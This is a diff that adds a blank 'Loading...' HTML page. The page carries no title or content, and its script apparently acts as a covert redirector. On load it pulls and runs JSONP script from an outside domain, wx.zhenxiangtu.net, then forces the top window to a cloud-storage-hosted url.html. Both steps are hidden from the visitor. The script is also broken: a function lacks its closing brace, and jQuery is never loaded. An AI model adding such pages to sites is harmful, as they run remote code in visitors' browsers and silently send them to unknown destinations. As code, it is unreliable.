@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no,maximum-scale=1,initial-scale=1" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="description" content="" />
+    <title></title>
+  </head>
+  <body>
+  Loading...
+  
+  <script>
+
+  
+ 
+  $(window).load(function() {
+            checkdomain();
+	       });
+	function checkdomain(){
+    $.ajax({
+        url: 'http://wx.zhenxiangtu.net/weixin/js.php?siteid=1',
+        dataType: "jsonp",
+        jsonpCallback: "callback",
+        success: function(result) {
+            //ok
+            if (top.location !== self.location) {
+              top.location.href = 'http://ynochp1567337551.oss-cn-shanghai.aliyuncs.com/url.html';
+            }
+        },
+        error: function(result) {
+            //showmsg("加载出错");
+        },
+    });
+
+  </script>
+  </body>
+
+</html>
